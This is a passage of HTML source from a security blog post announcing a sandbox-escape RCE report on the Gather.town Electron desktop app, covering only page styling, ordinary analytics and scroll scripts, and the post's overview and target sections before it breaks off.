var(--primary-text-color);font-size:40px;font-weight:700;margin-bottom:15px;padding-bottom:7px;text-align:center;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.category-page-header-wrapper .category-page-subtitle{font-size:20px;font-weight:500;padding-bottom:10px;text-align:center}.post-card-wrapper{display:flex;justify-content:center;min-height:150px;width:100%}.post-card-wrapper .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;height:100%;margin-bottom:15px;max-width:720px;padding:15px;transition:-webkit-transform .2s;transition:transform .2s;transition:transform .2s,-webkit-transform .2s;width:100%}.post-card-wrapper .post-card:hover .title{text-decoration:underline}@media(min-width:768px){.post-card-wrapper .post-card{margin-bottom:0}}.post-card-wrapper .post-card .title{font-size:18px;font-weight:600;line-height:1.4;margin-bottom:7px}.post-card-wrapper .post-card .description{-webkit-line-clamp:3;-webkit-box-orient:vertical;color:var(--primary-text-color);display:-webkit-box;font-size:13px;line-height:20px;margin-bottom:10px;overflow:hidden;text-overflow:ellipsis}.post-card-wrapper .post-card .info{color:var(--about-link-icon-color);display:flex;font-size:14px;justify-content:space-between;margin-top:auto}.post-card-wrapper .post-card .info .categories{display:flex}.post-card-wrapper .post-card .info .categories .category{margin-left:4px}.post-card-wrapper .post-card .info .categories .category:hover{text-decoration:underline}.post-card-column-wrapper{display:flex;justify-content:center;width:100%}.post-card-column-wrapper .post-card-column{align-items:center;display:flex;flex-direction:column}.post-card-column-wrapper .post-card-column .post-card-wrapper{margin-bottom:10px}.post-card-column-wrapper .post-card-column .more-post-card-button{background-color:var(--button-background-color);font-size:15px;font-weight:500;height:40px}.post-tabs-wrapper{align-self:flex-start;display:flex;flex-direction:column;justify-content:center;top:0;width:100%}.post-tabs-wrapper .post-tabs{display:flex;height:40px;justify-content:center;margin-bottom:12px;max-width:760px;width:100%}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root{color:var(--tab-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:17px;font-weight:500;height:40px;min-height:auto;min-width:auto;padding:10px 12px;transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected,.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root :hover{color:var(--tab-hover-text-color);transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected{background-color:var(--tab-selected-background-color);border-radius:8px;font-weight:600}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabScrollButton-root{height:40px;width:20px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-scrollable{height:40px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-indicator{display:none}</style><meta name="generator" content="Gatsby 3.14.6"/><style data-emotion="css-global o6gwfi">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:rgba(0, 0, 0, 0.87);font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#fff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#fff;}</style><style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style><style data-emotion="css 1l6di18 feqhe6 1yf1g2m mnn31 vubbuv 1yxmbwk 6flbmm">.css-1l6di18.Mui-focused .MuiAutocomplete-clearIndicator{visibility:visible;}@media (pointer: fine){.css-1l6di18:hover .MuiAutocomplete-clearIndicator{visibility:visible;}}.css-1l6di18 .MuiAutocomplete-tag{margin:3px;max-width:calc(100% - 6px);}.css-1l6di18 .MuiAutocomplete-inputRoot{-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiAutocomplete-inputRoot,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:30px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:56px;}.css-1l6di18 .MuiAutocomplete-inputRoot .MuiAutocomplete-input{width:0;min-width:30px;}.css-1l6di18 .MuiInput-root{padding-bottom:1px;}.css-1l6di18 .MuiInput-root .MuiInput-input{padding:4px 4px 4px 0px;}.css-1l6di18 .MuiInput-root.MuiInputBase-sizeSmall .MuiInput-input{padding:2px 4px 3px 0;}.css-1l6di18 .MuiOutlinedInput-root{padding:9px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiOutlinedInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:65px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-input{padding:7.5px 4px 7.5px 6px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall{padding:6px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall .MuiAutocomplete-input{padding:2.5px 4px 2.5px 6px;}.css-1l6di18 .MuiFilledInput-root{padding-top:19px;padding-left:8px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiFilledInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:65px;}.css-1l6di18 .MuiFilledInput-root .MuiFilledInput-input{padding:7px 4px;}.css-1l6di18 .MuiFilledInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall{padding-bottom:1px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall .MuiFilledInput-input{padding:2.5px 4px;}.css-1l6di18 .MuiInputBase-hiddenLabel{padding-top:8px;}.css-1l6di18 .MuiAutocomplete-input{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;text-overflow:ellipsis;opacity:1;}.css-feqhe6{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;width:100%;}.css-1yf1g2m{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;letter-spacing:0.00938em;color:rgba(0, 0, 0, 0.87);box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;position:relative;}.css-1yf1g2m.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}label+.css-1yf1g2m{margin-top:16px;}.css-1yf1g2m:after{border-bottom:2px solid #1976d2;left:0;bottom:0;content:"";position:absolute;right:0;-webkit-transform:scaleX(0);-moz-transform:scaleX(0);-ms-transform:scaleX(0);transform:scaleX(0);-webkit-transition:-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;pointer-events:none;}.css-1yf1g2m.Mui-focused:after{-webkit-transform:scaleX(1) translateX(0);-moz-transform:scaleX(1) translateX(0);-ms-transform:scaleX(1) translateX(0);transform:scaleX(1) translateX(0);}.css-1yf1g2m.Mui-error:after{border-bottom-color:#d32f2f;-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-1yf1g2m:before{border-bottom:1px solid rgba(0, 0, 0, 0.42);left:0;bottom:0;content:"\00a0";position:absolute;right:0;-webkit-transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;pointer-events:none;}.css-1yf1g2m:hover:not(.Mui-disabled):before{border-bottom:2px solid rgba(0, 0, 0, 0.87);}@media (hover: none){.css-1yf1g2m:hover:not(.Mui-disabled):before{border-bottom:1px solid rgba(0, 0, 0, 0.42);}}.css-1yf1g2m.Mui-disabled:before{border-bottom-style:dotted;}.css-mnn31{font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;}.css-mnn31::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:focus{outline:0;}.css-mnn31:invalid{box-shadow:none;}.css-mnn31::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-ms-input-placeholder{opacity:0.42;}.css-mnn31.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-mnn31:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}.css-1yxmbwk{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-align:center;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;font-size:1.5rem;padding:8px;border-radius:50%;overflow:visible;color:rgba(0, 0, 0, 0.54);-webkit-transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1yxmbwk::-moz-focus-inner{border-style:none;}.css-1yxmbwk.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1yxmbwk{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1yxmbwk:hover{background-color:rgba(0, 0, 0, 0.04);}@media (hover: none){.css-1yxmbwk:hover{background-color:transparent;}}.css-1yxmbwk.Mui-disabled{background-color:transparent;color:rgba(0, 0, 0, 0.26);}.css-6flbmm{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:2.1875rem;}</style><link rel="preconnect" href="https://www.google-analytics.com"/><link rel="dns-prefetch" href="https://www.google-analytics.com"/><script>
+  
+  function gaOptout(){document.cookie=disableStr+'=true; expires=Thu, 31 Dec 2099 23:59:59 UTC;path=/',window[disableStr]=!0}var gaProperty='UA-215889404-1',disableStr='ga-disable-'+gaProperty;document.cookie.indexOf(disableStr+'=true')>-1&&(window[disableStr]=!0);
+  if(true) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  }
+  if (typeof ga === "function") {
+    ga('create', 'UA-215889404-1', 'auto', {});
+      ga('set', 'anonymizeIp', true);
+      
+      
+      
+      
+      }</script><link rel="icon" href="/favicon-32x32.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><style type="text/css">
+    .anchor.before {
+      position: absolute;
+      top: 0;
+      left: 0;
+      transform: translateX(-100%);
+      padding-right: 4px;
+    }
+    .anchor.after {
+      display: inline-block;
+      padding-left: 4px;
+    }
+    h1 .anchor svg,
+    h2 .anchor svg,
+    h3 .anchor svg,
+    h4 .anchor svg,
+    h5 .anchor svg,
+    h6 .anchor svg {
+      visibility: hidden;
+    }
+    h1:hover .anchor svg,
+    h2:hover .anchor svg,
+    h3:hover .anchor svg,
+    h4:hover .anchor svg,
+    h5:hover .anchor svg,
+    h6:hover .anchor svg,
+    h1 .anchor:focus svg,
+    h2 .anchor:focus svg,
+    h3 .anchor:focus svg,
+    h4 .anchor:focus svg,
+    h5 .anchor:focus svg,
+    h6 .anchor:focus svg {
+      visibility: visible;
+    }
+  </style><script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+      var hash = window.decodeURI(location.hash.replace('#', ''))
+      if (hash !== '') {
+        var element = document.getElementById(hash)
+        if (element) {
+          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
+          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
+          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
+          // Wait for the browser to finish rendering before scrolling.
+          setTimeout((function() {
+            window.scrollTo(0, offset - 0)
+          }), 0)
+        }
+      }
+    })
+  </script><title data-react-helmet="true">Gather.town Portal feature SandBox Escape RCE 0-day Vulnerability Report</title><meta data-react-helmet="true" name="viewport" content="initial-scale=1, width=device-width"/><meta data-react-helmet="true" name="google-site-verification" content="CvtC0sASSbMS8Tt14xtB71jITvzabANsDzwmrUVJHAw"/><meta data-react-helmet="true" property="og:title" content="Gather.town Portal feature SandBox Escape RCE 0-day Vulnerability Report"/><meta data-react-helmet="true" property="og:site_title" content="Gather.town Portal feature SandBox Escape RCE 0-day Vulnerability Report"/><meta data-react-helmet="true" name="description" content="Overview During last year’s research, we conducted vulnerability analysis targeting metaverse-based commercial platforms. Among them, we would like to share some of the vulnerabilities that have been reported to the target company and have passed over time. When you think of the real metaverse as a category, you can see that all technologies are gathered in one place and are harmonious. Among them, based on mobile and VR equipment, you will feel closer to the three major elements of the metaver…"/><meta data-react-helmet="true" property="og:description" content="Overview During last year’s research, we conducted vulnerability analysis targeting metaverse-based commercial platforms. Among them, we would like to share some of the vulnerabilities that have been reported to the target company and have passed over time. When you think of the real metaverse as a category, you can see that all technologies are gathered in one place and are harmonious. Among them, based on mobile and VR equipment, you will feel closer to the three major elements of the metaver…"/><meta data-react-helmet="true" property="og:author" content="Zer0Luck"/><meta data-react-helmet="true" property="og:image" content="/og-image.png"/><meta data-react-helmet="true" property="og:type" content="website"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc4.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2"/><style>@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc-.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxM.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc-.woff) format("woff")}</style><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="alternate" type="application/rss+xml" href="/rss.xml"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){if(void 0===e.target.dataset.mainImage)return;if(void 0===e.target.dataset.gatsbyImageSsr)return;const t=e.target;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link as="script" rel="preload" href="/webpack-runtime-73f29b2cfeafab2e462d.js"/><link as="script" rel="preload" href="/framework-98bc37d489de49fb3b96.js"/><link as="script" rel="preload" href="/app-61878ba49aed1e6f5a29.js"/><link as="script" rel="preload" href="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-350e20f31e27e07c540f.js"/><link as="script" rel="preload" href="/component---src-templates-blog-template-js-484a59d2475d768e59bb.js"/><link as="fetch" rel="preload" href="/page-data/gathertown-rce-electronjs/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1073350324.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1956554647.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/2938748437.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="page-wrapper"><header class="page-header-wrapper"><meta name="google-site-verification" content="CvtC0sASSbMS8Tt14xtB71jITvzabANsDzwmrUVJHAw"/><div class="page-header"><div class="front-section"><a class="link" href="/">Zer0Luck</a></div><div class="trailing-section"><a class="link" href="/about">about</a><a class="link" href="/posts">posts</a><div class="MuiAutocomplete-root MuiAutocomplete-hasPopupIcon css-1l6di18"><div class="search-input-wrapper"><div class="MuiFormControl-root MuiFormControl-fullWidth MuiTextField-root search-input css-feqhe6"><div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl MuiInputBase-adornedEnd MuiAutocomplete-inputRoot css-1yf1g2m"><input type="text" aria-invalid="false" autoComplete="off" value="" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd MuiAutocomplete-input MuiAutocomplete-inputFocused css-mnn31" aria-autocomplete="list" aria-expanded="false" autoCapitalize="none" spellcheck="false" role="combobox"/><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium search-icon css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SearchOutlinedIcon"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg></div></div></div></div></div></div></header><main class="page-content"><header class="post-header"><div class="emoji">👻</div><div class="info"><div class="categories"><a class="category" href="/posts/0-day">0-day</a></div></div><h1 class="title">Gather.town Portal feature SandBox Escape RCE 0-day Vulnerability Report</h1><div class="info"><div class="author">posted by <strong>Zer0Luck</strong>,</div> <!-- -->July 01, 2022</div></header><div class="post-content"><div class="markdown"><p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADC0lEQVQoz03L20+bBQBA8e8vUROf5hIZvjiZGoYibFAsdKyMS2lpoRd6YaX9er8AtmWsZTMNJlVYjFm2LDhbCi2UW5zuEjXO+CIMV7upmVOGdKWIiQvHyJO/l/N0BNPkCuoeNV7RxdRnq0ylb/HhxQuIeh1f3f+F6PuTnNf34u3uQKHU4AjESQwHCGi1yCQtqAIf0FJbzVtVx3i7th5h6OM0dTXVKKVSvAE/gfcs2LraaXm9ik+Ts3R3q2g6VkFQJaf+jQrcLhPTl5PozUFONrUjOkXOapUkxs8hbZYgVOoaqDsto1l9AoniFEeVMl7R9dDorafLWcnhATWSkJpw5k0sl6pQXKqhwWGmureVIy4btX4NOtMpPOeUWCI9CDJrB3e+vsuzZ/9QLJb4o7TNrY1NYpc3+PZegZ+ePOL7Qp7Ckx8obOV5uFkg//hXNp9u8nPpT35/WqRc3CYRn8Ap+hHGxif5bi3Pf/b39w96MfEbFl+BsYnH3FhZ5tqVq8ymsqwsrpK8nmJjfZ293T1K20W2t7YOnmufXKFd0owQdIa5eeMO/5f7sowv9ojbd//iwcMHrK2vcT//I/c21inv7rD39x7l3TLlcpnSzs7B883nX+AZcCGEfWN8FJ9iKbNEbibNQnqRlcwS01cXWc4usJqdYyG9xNx0mvnUPLnMKrnkPHPXZ8mmsswlU2RmckzFE4wFxxHCgRg+13m89hAjDj8jwRguTwSPJ0LQOcKQ6MM5GMFlCxNwhAi4R7EZBrEOeHAY/XhMHrxiGMfgCCF/FKG33467rxW9thev9wI2nxurWUmPU4c3HMNqD2PXtyMaOnE7IojhCCbbGcz2TozBIXyuKIY+Nfa+NvRmN4K1T8Vy6B2ixnpEZxSrTUdc/jLD2uNojAO0nTGgljegba1D0XUWudLMpKOGmeGj2JxWRNsoE/2vkrG9gNVgRFBoTFhOH6e7U45oj6Dx2TEZTqCxyHmtsZlDFY0895KU5w+/y6FKKS8eaaFDdhK9pYn+oA+3OIpC3YVK3YbWKPIvOVhIs2MS4QMAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Gather.town"
+        title="Gather.town"
+        src="/static/f57770e07dfec8ff4aede4fb58b39c22/37523/rceS.png"
+        srcset="/static/f57770e07dfec8ff4aede4fb58b39c22/e9ff0/rceS.png 180w,
+/static/f57770e07dfec8ff4aede4fb58b39c22/f21e7/rceS.png 360w,
+/static/f57770e07dfec8ff4aede4fb58b39c22/37523/rceS.png 720w,
+/static/f57770e07dfec8ff4aede4fb58b39c22/302a4/rceS.png 1080w,
+/static/f57770e07dfec8ff4aede4fb58b39c22/07a9c/rceS.png 1440w,
+/static/f57770e07dfec8ff4aede4fb58b39c22/29114/rceS.png 1920w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<h2 id="overview" style="position:relative;"><a href="#overview" aria-label="overview permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Overview</h2>
+<p>During last year’s research, we conducted vulnerability analysis targeting metaverse-based commercial platforms. Among them, we would like to share some of the vulnerabilities that have been reported to the target company and have passed over time.</p>
+<p>When you think of the real metaverse as a category, you can see that all technologies are gathered in one place and are harmonious. Among them, based on mobile and VR equipment, you will feel closer to the three major elements of the metaverse: SPACE, AVATAR, and ITEM. However, depending on how each element is implemented and used, vulnerabilities and attack vectors occur, resulting in metaverse hacking, causing great damage.</p>
+<p>In this story, we will describe some of the several vulnerability analysis reports based on the <a href="https://www.gather.town/">https://www.gather.town/</a> platform.</p>
+<h2 id="target" style="position:relative;"><a href="#target" aria-label="target permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Target</h2>
+<ul>
+<li>Gather.town Binary based electronJS (Window, MacOS, Linux)</li>
+</ul>
